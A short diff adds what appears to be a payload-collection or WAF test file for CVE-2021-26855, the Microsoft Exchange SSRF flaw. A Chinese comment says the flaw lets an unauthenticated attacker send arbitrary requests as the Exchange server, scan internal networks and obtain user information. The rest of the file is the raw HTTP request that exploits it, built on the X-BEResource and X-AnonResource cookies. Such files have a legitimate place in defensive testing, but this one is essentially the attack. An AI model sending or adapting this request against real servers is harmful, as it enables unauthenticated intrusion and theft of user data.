@@ -1,0 +1,10 @@
+# Exchange SSRF漏洞
+# 在 CVE-2021-26855 Exchange SSRF漏洞中，攻击者可直接构造恶意请求，以Exchange server的身份发起任意HTTP请求，扫描内网，并且可获取Exchange用户信息。该漏洞利用无需身份认证
+GET /ecp/PeiQi.js?acid=80001697&bid=hd_tag_m8mv25bh HTTP/1.1
+Host: www.swaf.com
+Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true
+RM-PRO-BusinessID: hd_tag_m8mv25bh
+RM-PRO-Token: c8af34800d9925fa3b2d68e4a10a8d7b
+RM-PRO-Time: 1742808457897
+User-Agent: curl/7.83.1
+
